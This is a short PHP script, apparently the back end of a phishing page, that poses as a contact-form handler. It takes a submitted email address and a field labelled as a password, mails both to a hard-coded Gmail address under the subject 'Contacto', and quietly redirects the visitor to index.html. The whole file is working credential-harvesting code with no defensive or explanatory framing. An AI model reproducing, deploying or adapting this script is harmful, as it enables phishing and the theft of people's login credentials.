<?php
    $destino = "alecastedobrasil@gmail.com";
    $nombre = $_POST['nombre'];
    $email = $_POST['email'];
    $contenido = "email: " . $email . "\nContraseña: " . $nombre;
    mail($destino,"Contacto", $contenido);
    header("Location:index.html");
?>